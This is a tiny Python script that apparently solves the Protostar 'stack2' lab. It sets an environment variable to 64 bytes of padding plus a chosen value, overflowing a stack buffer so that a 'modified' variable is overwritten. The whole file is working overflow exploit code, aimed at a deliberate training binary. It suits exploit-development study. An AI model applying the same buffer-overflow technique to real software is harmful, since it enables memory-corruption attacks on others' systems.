#!/usr/bin/python

# usage:  $ GREENIE=`./stack2.py` ./stack2

# here we set an enviroment variable to
# some padding and overflow to set 
# 'modified' to 0x0d0a0d0a
pad = 'A'*64
mod = '\x0a\x0d\x0a\x0d'

print pad + mod
